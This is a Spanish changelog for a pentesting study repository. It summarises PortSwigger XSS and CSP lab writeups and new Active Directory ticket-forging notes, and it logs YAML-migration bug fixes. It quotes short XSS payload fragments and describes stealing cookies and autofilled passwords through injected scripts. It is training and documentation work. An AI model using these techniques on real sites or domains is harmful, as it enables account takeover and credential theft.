- `analisis-csrf.md`: + `portswigger/clickjacking-prefilled-form-input` y `portswigger/clickjacking-basic-csrf-protected` en `learning_refs:`. (Antes solo enlazaba labs de bypass por XSS y SameSite; ahora cubre también el vector de clickjacking, que es ortogonal al CSRF token.)

---

## [2026-05-04] — Sesión 19x (writeup PortSwigger CSP bypass via directive injection)

Lab corto pero muy didáctico. La CSP del lab incluía `report-uri /csp-report?token=` con el `token` reflejado tal cual desde el query string. Pasar `;` y comillas sin sanitizar permite añadir directivas nuevas al header. La directiva `script-src-elem 'unsafe-inline'`, al ser más específica que `script-src`, gana sobre `script-src 'self'` para los `<script>` elements y permite ejecutar inline.

### Hallazgos no triviales documentados en el writeup

1. **Si el header CSP se construye concatenando input de URL, la CSP es atacable via inyección de directivas**. El `;` es el separador de directivas; basta con que el reflejo no lo sanitice.

2. **CSP no es monotónica**. Añadir una directiva más específica puede *relajar* la política. `script-src 'self'; script-src-elem 'unsafe-inline'` es estrictamente menos seguro que `script-src 'self'` solo, porque `script-src-elem` gana para los `<script>` elements.

3. **`report-uri` es el portador típico del payload de inyección**, porque suele incluir identificadores dinámicos (tenant, sesión, deployment). En auditorías, leer cada directiva CSP buscando interpolaciones, no solo las "obvias".

4. **`report-uri` está deprecada** en favor de `report-to`. La migración elimina el caso de uso de meter valores dinámicos en el header CSP.

### Archivo nuevo
- **`learning/portswigger/reflected-xss-csp-directive-injection/writeup.md`**: 7 secciones cubriendo recon del sink y la CSP, identificación del reflejo en `report-uri`, jerarquía `script-src`/`script-src-elem`/`script-src-attr`, payload final, y contramedidas (incluye referencia al paper Weichselbaum et al. 2016 sobre la insecurity de allowlists CSP).

### Conexión inventario
- `explotacion-xss.md`: + `portswigger/reflected-xss-csp-directive-injection` en `learning_refs:`. + aliases `CSP directive injection, script-src-elem override`.
- `analisis-seguridad-cabeceras.md`: + `portswigger/reflected-xss-csp-directive-injection` en `learning_refs:`. + aliases `CSP directive injection, report-uri injection, script-src-elem precedence`.

---

## [2026-05-04] — Sesión 19w (writeup PortSwigger CSP estricta + dangling markup attack)

Lab más complejo de la serie hasta ahora. Combina XSS reflejado, CSP estricta sin `form-action` listada, dangling markup con `<button formaction>`, ataque 2-stage entre exploit server y lab, y manejo de SameSite=Lax cookies. 30+ minutos de debugging real, tres iteraciones del payload del exploit server.

### Hallazgos no triviales documentados en el writeup

1. **`form-action` omitida en CSP es la grieta más recurrente**. Las directivas script-src/style-src/img-src se documentan religiosamente, pero `form-action` se olvida frecuentemente. Es la palanca para hijack de submisiones cross-origin.

2. **SameSite=Lax bloquea cookies en POST cross-site, NO en GET top-level**. Por eso el truco de `formmethod="get"` en lugar de POST: capturar el csrf vía GET (cookies sí se mandan), después hacer un POST same-origin desde el exploit server (cookies sí se mandan otra vez).

3. **`new URL(location)` falla silenciosamente en algunos headless browsers**. El bot de PortSwigger es uno. Workaround robusto: `location.search.match(/[?&]csrf=([^&]+)/)`. Mismo patrón con `document.body` (puede ser null) → `document.documentElement` (siempre existe).

4. **2-stage attack con exploit server**: stage 1 redirige al lab con dangling markup, stage 2 captura csrf en URL del exploit server y auto-submitea POST a change-email. El bot necesita visitar el exploit server DOS veces (una para redirect, otra después de clickear).

### Archivo nuevo
- **`learning/portswigger/reflected-xss-very-strict-csp-dangling-markup/writeup.md`** + `solved.png`: 9 secciones cubriendo análisis del CSP, estrategia 2-stage con diagrama de secuencia, payload de dangling markup, body completo del exploit server con explicación de los detalles defensivos del JS, y debugging real (3 iteraciones documentadas).

### Conexión inventario
- `explotacion-xss.md`: + `portswigger/reflected-xss-very-strict-csp-dangling-markup` en `learning_refs:`.
- `explotacion-xss.md`: + aliases `dangling markup attack, formaction hijack, two-stage CSRF chain, SameSite bypass via GET`.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 129/129 validate OK.
- TOPICS.md regenerado.

## [2026-05-03] — Sesión 19v (writeup PortSwigger XSS javascript URL chars blocked - throw onerror trick)

Lab "Reflected XSS in a JavaScript URL with some characters blocked". Reflejo en el body de un `fetch()` dentro de una URL `javascript:` que es el `href` de un `<a>`. Filtros descubiertos vía sondeos atómicos (8 probes esta vez, metodología completa): el server BORRA paréntesis y backticks; el resto pasa URL-encoded.

### Hallazgos clave en el writeup

1. **Stack de codificación de 4 capas** entre input y ejecución (URL-request → server URL-encode → HTML attr decode al parsear → URL-decode del browser al navegar a `javascript:` → JS parser). Cada capa es una superficie potencial.
2. **`throw onerror=alert,X` + override de `toString`** como forma de invocar funciones sin paréntesis ni backticks. El trick canónico cuando un blocklist cubre las dos formas convencionales (`f()` y `` f`` ``).
3. **Bug de balanceo de llaves en mi primer payload**: cerrar el object literal con `}` propio dejaba un `}` huérfano del original sin consumir → SyntaxError. Fix documentado: terminar el payload con `+{a:'` para que el `}` original cierre `{a:''}`. Lección reusable: cualquier breakout en sinks anidados tiene que dejar el árbol sintáctico válido.

### Archivo nuevo
- **`learning/portswigger/reflected-xss-javascript-url-some-characters-blocked/writeup.md`** + `solved.png`: 9 secciones cubriendo el sink, las 4 capas de codificación, los 8 sondeos atómicos como tabla, el truco `throw onerror`, el debug del syntax error de mi primer payload, mermaid del flujo, contramedidas y comparación con labs anteriores en términos de "número de capas".

### Conexión inventario
- `analisis-xss.md`: + `portswigger/reflected-xss-javascript-url-some-characters-blocked` en `learning_refs:`.
- `analisis-xss.md`: + aliases `javascript URL injection, throw onerror trick, toString override XSS`.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 129/129 validate OK.
- TOPICS.md regenerado.

## [2026-05-03] — Sesión 19u (writeup PortSwigger XSS event handlers/href blocked - SVG animate)

Lab "Reflected XSS with event handlers and href attributes blocked". Vuelta a la fase de descubrimiento de contexto. Whitelist de tags + bloqueo de TODOS los `on*` y de `href=` literal. La técnica clave es nueva: **SVG `<animate>` para escribir un atributo prohibido sin escribirlo literalmente**. El bot del lab clickea texto que diga "Click", así que el target es un `<a>` SVG con `href` animado a `javascript:alert(1)`.

### Hallazgo metodológico documentado en el writeup

La descripción del lab lista los filtros explícitamente. En engagements reales esa lista no existe. El writeup deja un "honesty check" señalado: el camino riguroso es sondear tag a tag (tabla de probes en sección 2), pero acepté la pista del lab por brevedad. Lección operacional para el siguiente lab que NO liste los filtros.

### Archivo nuevo
- **`learning/portswigger/reflected-xss-event-handlers-href-blocked/writeup.md`** + `solved.png`: 10 secciones cubriendo el modelo de filtro, por qué cada ruta clásica está cerrada, cómo `<animate>` escribe atributos sin que aparezcan en el wire format, payload completo con análisis de cada elemento, mermaid del flujo, contramedidas (allowlist + parser semántico vs blocklist + regex) y lección general sobre sub-lenguajes embebidos en HTML (SVG, MathML, CSS, JS).

### Conexión inventario
- `analisis-xss.md`: + `portswigger/reflected-xss-event-handlers-href-blocked` en `learning_refs:`.
- `analisis-xss.md`: + aliases `SVG animate XSS, mutation XSS, mXSS`.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 129/129 validate OK.
- `build_indexes --check` up to date tras regeneración de TOPICS.md.

## [2026-05-03] — Sesión 19t (writeup PortSwigger XSS capture passwords + ampliación de explotacion-xss)

Lab "Exploiting cross-site scripting to capture passwords". Mismo bot/firewall que el de cookie stealing, pero el target son credenciales en plano (no la cookie). La técnica clave es nueva: **abuso del autofill del password manager del navegador**. Inyectar `<input name=username>` + `<input type=password onchange=...>` en un comentario stored XSS hace que el navegador del bot autocomplete silenciosamente y el handler `onchange` exfiltre user:password. Reusa el patrón same-origin establecido en el writeup de cookies (publicar como comentario en el blog).

### Archivo nuevo
- **`learning/portswigger/exploiting-xss-to-capture-passwords/writeup.md`** + `solved.png`: 9 secciones cubriendo la mecánica del autofill, el payload con Collaborator y su variante same-origin, por qué aquí NO hace falta `DOMContentLoaded` (timing controlado por el browser via onchange, no por el parser), y comparación con form override.

### Ampliación de `explotacion-xss.md`
- Nueva sección **"Password manager autofill abuse"** con dos variantes (Collaborator + same-origin) y nota sobre `username.value` global por `id` y por qué `autocomplete="off"` no defiende.
- `aliases:` + `password manager autofill abuse, credential capture`.
- `learning_refs:` + `portswigger/exploiting-xss-to-capture-passwords`.
- Sección de Referencias enlaza el nuevo writeup.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 129/129 validate OK.
- `build_indexes --check` up to date tras regeneración de TOPICS.md.

## [2026-05-03] — Sesión 19s (cierre del par analisis/explotacion para XSS)

Hueco estructural detectado al revisar los writeups recientes: el inventario tenía `analisis-xss.md` pero NO `explotacion-xss.md`, mientras que para SQLi sí existe el par (`analisis-sqli` ↔ `explotacion-sqli`). Los 4 writeups recientes de "Exploiting XSS" estaban todos referenciados desde `analisis-xss`, lo cual es incorrecto desde el modelo del inventario (los labs de explotación pertenecen a la fase de explotación).

### Archivo nuevo (129 técnicas total)
- **`inventario/04-explotacion/web/explotacion-xss.md`** (T1539 + T1185 + T1059.007): cubre cookie hijacking (3 variantes incluyendo auto-exfiltración same-origin), XSS chain hacia CSRF, form override / credential capture, keylogger client-side, port scan interno desde el navegador de la víctima, bypass de CSP (JSONP, framework gadgets, side-channels CSS), tabla de exfil same-origin para entornos con firewall (PortSwigger Academy). 9 secciones, 8 contramedidas.

### Redistribución de learning_refs
- `analisis-xss.md`: -2 refs (`exploiting-xss-to-steal-cookies`, `exploiting-xss-to-bypass-csrf-defenses` salen de aquí, son labs de explotación pura).
- `explotacion-xss.md`: +2 refs (los anteriores, en su nuevo sitio correcto).
- Los 7 labs de descubrimiento/contexto/CSTI permanecen en `analisis-xss.md`.

### Conexión bidireccional
- `analisis-xss.md`: + `explotacion-xss` en `related:`.
- `explotacion-xss.md`: `related: [analisis-xss, analisis-csrf, analisis-seguridad-cabeceras]`.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 129/129 validate OK (era 128, +1 por explotacion-xss.md).
- `build_indexes --check` regenera 6 archivos: `04-explotacion/web/INDEX.md`, `TOPICS.md`, los 4 meta/* (by-mitre, by-difficulty, by-platform, by-fase).

## [2026-05-03] — Sesión 19r (writeup PortSwigger XSS cookie stealing + hallazgo del firewall del lab)

Lab: "Exploiting cross-site scripting to steal cookies". Stored XSS trivial en comentarios; el reto real fue exfiltrar la cookie del bot sin Burp Pro. La sesión documenta dos hallazgos no obvios que merecen quedar registrados.

### Hallazgos no obvios

1. **Firewall egress del lab de PortSwigger Academy**: bloquea salidas a webhook.site, interactsh, requestbin y similares. Solo deja pasar tráfico a Burp Collaborator (`*.oastify.com`) y al exploit server propio del lab. Confirmado tras debugging fallido (~30 min con bot que ejecutaba el script pero cuyo `fetch` nunca llegaba a webhook.site) y revisión del foro oficial. Anotado en `memory/project_portswigger_firewall.md` como memoria persistente para no repetir el error en futuras sesiones.

2. **Auto-exfiltración same-origin como alternativa a Collaborator**: cuando el lab no provee exploit server y el atacante no tiene Burp Pro, el patrón es usar un endpoint same-origin del propio lab que persista contenido legible. En este caso, el script malicioso publica un comentario nuevo en el blog usando la cookie del bot como cuerpo del comentario; el atacante refresca el post y la lee en texto plano. Cero tráfico saliente, no toca el firewall.

3. **Bug de DOM timing**: el primer payload same-origin fallaba con `Cannot read properties of null (reading 'value')` porque `<script>` inline ejecuta cuando el parser HTML lo encuentra, ANTES de que los elementos posteriores en el DOM (el form con el token CSRF al final de la página) existan. Fix: diferir con `addEventListener('DOMContentLoaded', ...)`.

### Archivos nuevos
- **`learning/portswigger/exploiting-xss-to-steal-cookies/writeup.md`**: 10 secciones cubriendo el camino real (incluyendo el plan-A fallido con webhook.site), el flujo same-origin con diagrama de secuencia, el debug del DOM timing, y una tabla de tipos-de-exfil con sus alternativas same-origin para futuros labs.
- **`learning/portswigger/exploiting-xss-to-steal-cookies/solved.png`**: confirmación del lab.

### `learning/portswigger/PENDING.md` reescrito
- El archivo evolucionó de "labs aplazados" a documento de hallazgo del firewall del lab + razones recurrentes esperables.
- Los dos labs que estaban listados (`lab-stealing-cookies`, `lab-capturing-passwords`) salen de la lista: el primero se completó en esta sesión y el segundo es resoluble por la misma técnica same-origin.

### Conexión inventario
- `inventario/03-analisis-vulnerabilidades/web/analisis-xss.md`: + `portswigger/exploiting-xss-to-steal-cookies` en `learning_refs:`.

### Memoria persistente nueva
- `memory/project_portswigger_firewall.md` (nuevo): documenta el comportamiento del firewall del lab y las rutas alternativas. Indexado en `MEMORY.md`.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 128/128 validate OK.
- `build_indexes --check` up to date tras regeneración de `TOPICS.md`.

## [2026-05-03] — Sesión 19q (writeup PortSwigger AngularJS sandbox escape + CSP)

Writeup del lab "Reflected XSS with AngularJS sandbox escape and CSP". El reto combina client-side template injection en AngularJS con una CSP que bloquea handlers inline nativos; el bypass usa `ng-focus`, fragment `#x`, `$event.composedPath()` y `orderBy` para ejecutar `alert(document.cookie)`.

### Archivo nuevo
- **`learning/portswigger/reflected-xss-angularjs-sandbox-escape-and-csp/writeup.md`**: explicación de CSP como política aplicada por el navegador, diferencia entre `onfocus` nativo y `ng-focus` de AngularJS, payload del exploit server, flujo de activación con `#x`, diagrama mermaid y contramedidas.
- **`learning/portswigger/reflected-xss-angularjs-sandbox-escape-and-csp/solved.png`**: captura del lab resuelto.

### Conexión inventario
- `inventario/03-analisis-vulnerabilidades/web/analisis-xss.md`: + `portswigger/reflected-xss-angularjs-sandbox-escape-and-csp` en `learning_refs:`.
- `inventario/03-analisis-vulnerabilidades/web/analisis-seguridad-cabeceras.md`: + aliases `Content Security Policy`, `CSP`, `HTTP Security Headers`; `related: [analisis-xss]`; + learning ref al lab.
- `inventario/TOPICS.md`: regenerado para reflejar los nuevos aliases, enlaces y referencias prácticas.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 128/128 validate OK.
- `build_indexes --check` up to date tras regeneración de `TOPICS.md`.

## [2026-05-03] — Sesión 19p (writeup PortSwigger AngularJS sandbox escape)

Writeup del lab "Reflected XSS with AngularJS sandbox escape without strings". El reto usa client-side template injection en AngularJS: `{{7*7}}` como valor de `search` no se evalúa; el punto explotable es el nombre de un parámetro que llega a `$parse`.

### Archivo nuevo
- **`learning/portswigger/reflected-xss-angularjs-sandbox-escape-without-strings/writeup.md`**: reconocimiento del contexto `$parse(key)`, explicación del payload sin strings, escape `charAt=[].join`, uso de `orderBy` como sustituto de `$eval`, diagrama mermaid y contramedidas.
- **`learning/portswigger/reflected-xss-angularjs-sandbox-escape-without-strings/solved.png`**: captura del lab resuelto.

### Conexión inventario
- `inventario/03-analisis-vulnerabilidades/web/analisis-xss.md`: + aliases `Client-Side Template Injection`, `CSTI`, `AngularJS sandbox escape`.
- `inventario/03-analisis-vulnerabilidades/web/analisis-xss.md`: + `portswigger/reflected-xss-angularjs-sandbox-escape-without-strings` en `learning_refs:`.
- `inventario/TOPICS.md`: regenerado para reflejar los nuevos aliases y enlaces.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 128/128 validate OK.
- `build_indexes --check` up to date tras regeneración de `TOPICS.md`.

## [2026-05-03] — Sesión 19o (writeup PortSwigger XSS para bypass CSRF)

Writeup del lab "Exploiting XSS to bypass CSRF defenses". El reto combina stored XSS en comentarios con lectura same-origin de `/my-account` para extraer el token anti-CSRF y enviarlo en `POST /my-account/change-email`.

### Archivo nuevo
- **`learning/portswigger/exploiting-xss-to-bypass-csrf-defenses/writeup.md`**: flujo de reconocimiento, payload `XMLHttpRequest` compacto, explicación de por qué XSS invalida la premisa de los tokens anti-CSRF, resumen mermaid y contramedidas.

### Conexión inventario
- `inventario/03-analisis-vulnerabilidades/web/analisis-xss.md`: + `portswigger/exploiting-xss-to-bypass-csrf-defenses` en `learning_refs:`.
- `inventario/03-analisis-vulnerabilidades/web/analisis-csrf.md`: + `portswigger/exploiting-xss-to-bypass-csrf-defenses` en `learning_refs:`.
- `inventario/TOPICS.md`: regenerado para reflejar los nuevos enlaces.

### Verificación
- `bash scripts/check.sh` → all green.
- 143 tests passing.
- 128/128 validate OK.
- `build_indexes --check` up to date tras regeneración de `TOPICS.md`.

## [2026-05-03] — Sesión 19n (writeup PortSwigger XSS template literal)

Quinto writeup de la serie PortSwigger XSS-en-JS-string. Lab: "Reflected XSS into a JavaScript string with angle brackets, single, double quotes, backslash and backticks Unicode-escaped". El reto filtra `<>`, `'`, `"`, `` ` `` y `\` (todos escapados). El payload ganador es `${alert(1)}` aprovechando que la entrada se refleja dentro de un **template literal** y la interpolación `${...}` es sintaxis de lenguaje, no caracteres tipográficos.

### Archivo nuevo
- **`learning/portswigger/reflected-xss-js-template-literal-escapes/writeup.md`**: 9 secciones. Recon atómico de cada filtro, explicación de por qué `'string'` ≠ `` `template` `` a nivel de parser (template literals interpretan `${expr}` mientras que strings tradicionales no), payload `${alert(1)}` y URL final, mermaid del flujo, contramedidas (escape de `${`, JSON.stringify, evitar reflexión en JS server-side), y taxonomía resumen de contextos JS de XSS. Cross-link al lab anterior (`reflected-xss-js-string-sq-backslash-escaped`) y a `analisis-xss.md`.

### Conexión inventario
- `inventario/03-analisis-vulnerabilidades/web/analisis-xss.md`: +1 entrada en `learning_refs:` (`portswigger/reflected-xss-js-template-literal-escapes`). Total 5 labs PortSwigger XSS conectados al archivo principal.

### Verificación
- `bash scripts/check.sh` → all green.
- 128/128 validate OK.
- `build_indexes --check` up to date tras regeneración (TOPICS.md actualizado para reflejar el nuevo learning_ref).

## [2026-05-03] — Sesión 19m (Sprint B: cobertura AD ticket-forging)

Hueco de coverage real identificado por el agente 2 del stress-test: T1558.001 Golden Ticket, T1558.002 Silver Ticket, T1550.003 Pass-the-Ticket no tenían archivos dedicados, y Kerberoasting estaba sepultado dentro de `enumeracion-kerberos.md` (mezclando enumeración + extracción de credenciales). Sprint B añade 4 archivos nuevos al cluster AD y reconecta el grafo `related:`.

### Archivos nuevos (4 técnicas, 128 total)

- **`04-explotacion/credenciales/explotacion-kerberoasting.md`** (T1558.003 + T1558.004): combinado Kerberoasting y AS-REP Roasting. Diferencia operacional clave: Kerberoasting requiere credenciales válidas de cualquier usuario, AS-REP Roasting no. Cubre Impacket (`GetUserSPNs`, `GetNPUsers`), Rubeus (`kerberoast`, `asreproast`), PowerView, hashcat modes 13100/18200, john (`krb5tgs`/`krb5asrep`). Pareja cross-fase con `enumeracion-kerberos.md`.

- **`05-post-explotacion/lateral-movement/golden-ticket.md`** (T1558.001): forja de TGT con la clave de krbtgt. Cubre mimikatz `kerberos::golden`, Impacket `ticketer.py`, Rubeus `golden`. Incluye pre-requisito DCSync (extracción del hash de krbtgt), variantes RC4 vs AES-256, persistencia con usuarios inexistentes, y detección via Defender for Identity. Contramedida principal: rotación DOBLE de krbtgt con ≥10 horas entre resets.

- **`05-post-explotacion/lateral-movement/silver-ticket.md`** (T1558.002): forja de TGS con la clave de una computer account o cuenta de servicio. Bypassa el TGS-REQ totalmente (el atacante construye el ticket localmente, no contacta al KDC). Cubre los 6 SPNs frecuentes de forja (cifs, host, ldap, MSSQLSvc, HTTP, HOST), comparación contra Golden Ticket, contramedida via Protected Users + AES-256.

- **`05-post-explotacion/lateral-movement/pass-the-ticket.md`** (T1550.003): reutilización de tickets Kerberos robados de LSASS o ccache. Cubre extracción con mimikatz `sekurlsa::tickets /export` y Rubeus `dump`/`monitor`/`ptt`, conversión cross-platform `.kirbi` ↔ `.ccache` con `ticketConverter.py`, uso desde Linux via `KRB5CCNAME`. Comparación explícita contra PtH (PtH usa hash, PtT usa ticket) y caso compuesto Silver+PtT.

### `related:` del cluster existente reconectado

6 archivos previos actualizados para apuntar a los nuevos:
- `enumeracion-kerberos`: + `explotacion-kerberoasting` (cierra el par cross-fase)
- `pass-the-hash`: + `pass-the-ticket` (alternativa Kerberos)
- `credential-dumping`: + `golden-ticket`, `silver-ticket`, `pass-the-ticket` (es la fuente de hashes/tickets que estos consumen)
- `explotacion-hash-cracking`: + `explotacion-kerberoasting` (los TGS Kerberoasted terminan crackeándose ahí)
- `ejecucion-remota-windows`: + `pass-the-ticket` (vector de autenticación válido para los exec remotos)
- `windows-arquitectura-ad`: + `golden-ticket`, `silver-ticket` (complementan el panorama AD)

### AGENTS.md
- Conteo actualizado: 165 → 169 archivos Markdown (128 técnicas + 40 INDEX + 1 TEMPLATE).
- Cookbook menciona los 128 archivos migrados.

### Verificación
- `bash scripts/check.sh` → all green.
- 128/128 validate OK.
- `build_indexes --check` up to date tras regeneración (TOPICS.md + 4 meta/* + INDEX hojas afectados).
- Las cadenas operacionales del stress-test ahora tienen archivos dedicados: "qué hacer con un hash de krbtgt" → `golden-ticket.md` directo. "TGS Kerberoasted" → `explotacion-kerberoasting.md` → `explotacion-hash-cracking.md`.

## [2026-05-03] — Sesión 19l (Sprint A: cierre del gap detectado por stress-test)

Tras el stress-test de discoverabilidad (2 agentes con contexto frío resolviendo 8 escenarios reales), ambos convergieron en el mismo cuello de botella: cluster AD/red/credenciales tiene `related:` mayormente vacío, así que las cadenas operacionales ("tengo hashes NTLM, ¿qué sigue?", "AD pentest end-to-end") requerían inferencia manual. Sprint A cierra ese gap específico sin tocar los 71 archivos restantes que ya funcionaban clean.

### Fix del cookbook AGENTS.md
El primer agente tropezó con el patrón `inventario/**/*.md`: requiere `shopt -s globstar` que no está activo por default en bash. **Convertido todo el cookbook a `grep -r ... inventario/`** que es portable sin configuración previa. Añadida nota explícita sobre la portabilidad arriba del bloque, y mención de `rg -g '*.md'` como alternativa con ripgrep. Eliminado el comentario sobre "fases legacy" (todas las fases ya están migradas).

### `related:` enriquecidos en 13 archivos del cluster AD/red/creds
Edges añadidos por consenso de ambos agentes (overlap >80% en sus reportes):
- `explotacion-smb-relay`: → mitm-responder, mitm6, adcs-relay, pass-the-hash, credential-dumping, hash-cracking, enumeracion-smb (estaba `[]`)
- `explotacion-mitm-responder`: → smb-relay, hash-cracking, pass-the-hash, mitm6 (estaba `[]`)
- `explotacion-mitm6`: → mitm-responder, smb-relay, adcs-relay (estaba `[]`)
- `explotacion-adcs-relay`: → smb-relay, bloodhound, ldap, kerberos, pass-the-hash (estaba `[]`)
- `explotacion-hash-cracking`: → credential-dumping, pass-the-hash, kerberos, mitm-responder (estaba `[]`)
- `windows-arquitectura-ad`: → ldap, kerberos, smb, bloodhound, pass-the-hash, credential-dumping (estaba `[]`)
- `enumeracion-kerberos`: añadido `explotacion-hash-cracking` (los TGS Kerberoasted se crackean ahí)
- `enumeracion-winrm`, `enumeracion-rdp`: → ejecucion-remota-windows
- `pass-the-hash`, `credential-dumping`: añadidas edges hacia hash-cracking

### `aliases` enriquecidos con vocabulario operacional
- `pass-the-hash`: + "NTLM hash dump", "hash dump", "Pass the Hash"
- `credential-dumping`: + "NTLM dump", "hash dump", "secretsdump"
- `explotacion-hash-cracking`: + "hashcat", "John the Ripper", "JtR", "NTLM cracking", "TGS cracking", "AS-REP cracking"
- `enumeracion-winrm`: + "evil-winrm", "WinRM Pass-the-Hash", "winrs"
- `enumeracion-rdp`: + "BlueKeep" (CVE conocido), "xfreerdp", "rdesktop"
- `explotacion-smb-relay`: + "NTLM relay", "relay attack", "ntlmrelayx", "impacket-ntlmrelayx"
- `explotacion-mitm-responder`: + "Responder", "LLMNR poisoning", "NBT-NS poisoning", "Net-NTLM", "NetNTLMv2", "NTLM relay"
- `explotacion-mitm6`: + "mitm6", "IPv6 takeover", "WPAD spoofing", "DHCPv6 takeover"
- `explotacion-adcs-relay`: + "ADCS abuse", "ADCS Relay", "ESC1", "ESC8", "Certipy", "Active Directory Certificate Services"
- `windows-arquitectura-ad`: + "Active Directory", "AD architecture", "AD pentest"
- `analisis-deserialization`, `explotacion-deserialization`: + "Java deserialization", "ysoserial", "CommonsCollections", "rO0AB", ".NET deserialization", "marshalsec"

### Verificación end-to-end de queries operacionales
- `grep -rl "^aliases:.*NTLM dump" inventario/` → encuentra credential-dumping (antes no matcheaba nada).
- `grep -rl "^aliases:.*hashcat" inventario/` → encuentra explotacion-hash-cracking.
- `grep -rl "^aliases:.*ysoserial" inventario/` → encuentra ambos archivos de deserialización.
- `grep -rl "^aliases:.*ESC[18]" inventario/` → encuentra adcs-relay.
- `related:` de smb-relay y windows-arquitectura-ad ahora apunta a 6+ archivos cada uno; cadena AD navegable sin grep adicional.

### Hallazgos de coverage real (NO atacados en Sprint A, dejados para Sprint B opcional)
- T1558.001 Golden Ticket y T1558.002 Silver Ticket no tienen archivos dedicados.
- Pass-the-Ticket tampoco existe.
- Kerberoasting está sepultado dentro de `enumeracion-kerberos.md` (mezcla enumeración + extracción de credenciales). Merece archivo propio en `04-explotacion/credenciales/explotacion-kerberoasting.md` con par cross-fase.

### Estado tras Sprint A
- `bash scripts/check.sh` → all green.
- 143 tests passing (sin cambios en tests, sólo data + cookbook).
- 124/124 validate OK.
- TOPICS.md regenerado para reflejar nuevas aliases/related.
- Escenarios 4 y 7 del stress-test (ambos messy en uno o ambos agentes) ahora resolverían en 1-2 queries dirigidas.

## [2026-05-03] — Sesión 19k (Review crítico ronda 5)

Dos hallazgos (Media + Media). El primero es un bug puntual; el segundo me hizo replantear el approach de la ronda 4.

### Hallazgo 1 (Media) — slug emitido sin pasar por yaml_scalar
- `build_frontmatter()` quotaba `title` y los arrays vía `yaml_scalar`/`yaml_array`, pero emitía `slug`, `plataforma`, `dificultad` con f-string raw. Un legacy `no.md` migraba a `slug: no` que PyYAML resuelve a `False`. Después validate.py reporta `slug must be string, got bool` y se rompe la convención `slug == path.stem`.
- **Fix**: los 3 campos pasan por `yaml_scalar` ahora. Los enums actuales (Web/Linux/Avanzada/etc.) no colisionan con scalars reservados, pero la emisión defensiva resiste cambios futuros del schema.
- **Tests**: `test_build_frontmatter_slug_round_trip` con 6 slugs problemáticos (no/yes/true/null/123/0xff). `test_build_frontmatter_plataforma_dificultad_through_yaml_scalar` con valores hipotéticos `On`/`1.0`.

### Hallazgo 2 (Media) — Cobertura incompleta de tipos implícitos PyYAML
- La ronda 4 había añadido regex para bool/null/números, pero PyYAML también resuelve **timestamps** (`2024-01-01` → `datetime.date`) y **special floats** (`.nan`, `.inf`, `+.inf`, `-.inf` → `float`). Mis regex no los cubrían.
- **Decisión arquitectónica**: en lugar de seguir enumerando categorías YAML 1.1 una por una (ya van 4 sesiones encontrando casos faltantes), delegar a PyYAML mismo via round-trip. Si `yaml.safe_load(f"_: {s}\\n")` no devuelve `{_: <s>}` con `<s>` como string igual al original, hay que quotar. Cubre TODA resolución implícita sin enumerarla.
- **Implementación**: `_needs_quoting()` reescrito. Mantiene early-exit rápido para chars especiales, prefijos reservados, trailing whitespace, y string vacío. Para todo lo demás, llama a `yaml.safe_load` y verifica round-trip.
- **Performance**: ~1ms por scalar via PyYAML. Para migrar 124 archivos (~10 scalars c/u = 1240 calls) → < 2s total. Aceptable.
- **Bonus**: la delegación me corrigió mi propia enumeración previa. Tests de ronda 4 asumían que `Y`, `n`, `None`, `1e10`, `0o777` se resolvían pero PyYAML los lee como string. Eran sobre-aserciones. La nueva implementación correctamente los marca como safe-unquoted.

### Tests reorganizados
- `test_yaml_scalar_quotes_pyyaml_implicit_types`: parametrize unificado con todos los casos que PyYAML SÍ resuelve. Listas internas categorizadas: `_RESOLVES_TO_BOOL`, `_RESOLVES_TO_NULL`, `_RESOLVES_TO_NUMBER`, `_RESOLVES_TO_DATE`, `_RESOLVES_TO_DATETIME`, `_RESOLVES_TO_SPECIAL_FLOAT`. Verificadas empíricamente con `yaml.safe_load` antes de añadir.
- `test_yaml_scalar_does_not_quote_safe_strings`: parametrize con casos que PyYAML lee como string. Documenta explícitamente qué NO se quota (Y, n, None, 1e10, 0o777, etc.) para no regresionar a sobre-quoting.
- `test_build_frontmatter_round_trip` ampliado con `2024-01-01`, `.nan`, `+.inf` además de los previos.
- `test_build_frontmatter_slug_round_trip` y `test_build_frontmatter_plataforma_dificultad_through_yaml_scalar` nuevos.

### Sutileza encontrada por los tests
PyYAML requiere **signo explícito en el exponente** para resolver float: `1.0e+10` → float, `1.0e10` → string. Mismo con `1.0E5` → string (no exp). Documentado en el comentario del regex `_RESOLVES_TO_NUMBER`.

### Estado tras ronda 5
- `bash scripts/check.sh` → all green.
- 143 tests passing (40 nuevos respecto a sesión 19j).
- 124/124 validate OK.
- `build_indexes --check` up to date.

## [2026-05-03] — Sesión 19j (Review crítico ronda 4: YAML implicit type resolution)

Un hallazgo (Media) en `migrate_frontmatter.py` sobre resolución implícita de tipos YAML 1.1. Bug profundo y futuro-proof. Aplicado con cobertura paramétrica.

### Hallazgo (Media)
PyYAML safe_load resuelve scalars no-quoted como `No`, `Yes`, `True`, `Off`, `null`, `~` a bool/null por la spec YAML 1.1. Lo mismo con strings que parecen números (`123`, `1.5`, `0xFF`, `1e10`). El emitter manual de migrate_frontmatter sólo chequeaba caracteres especiales (`:`, `,`, `[`, etc.) e ignoraba estas categorías reservadas. Reproduce: un legacy `# No` migra a:

```yaml
title: No
slug: no
aliases: [No]
```

Que PyYAML parsea como `{title: False, slug: False, aliases: [False]}`. Después validate.py reporta `title must be string, got bool`. El frontmatter es objetivamente inválido.

### Decisión: ampliar quoting manual en lugar de yaml.safe_dump
Evalué la sugerencia del reviewer de usar `yaml.safe_dump`. Rechazado: el default rompe la convención inline para arrays (`fase:\n- Reconocimiento` en lugar de `fase: [Reconocimiento]`). Forzar `default_flow_style=True` global produce mappings en flow `{title: ..., slug: ..., ...}` que es peor. No vale el rework de los 124 archivos por un fix que se puede hacer en 30 líneas con regex bien diseñadas.

### Fix
- Nuevo `_needs_quoting()` consulta tres regex: `_YAML_RESERVED_SCALARS` (true/false/yes/no/on/off/y/n/null/None/~ case-insensitive), `_YAML_NUMBER` (int/float/exp), `_YAML_NUMBER_RADIX` (0x/0o/0b/octal). También cubre flow-context special chars, prefijos reservados y trailing whitespace.
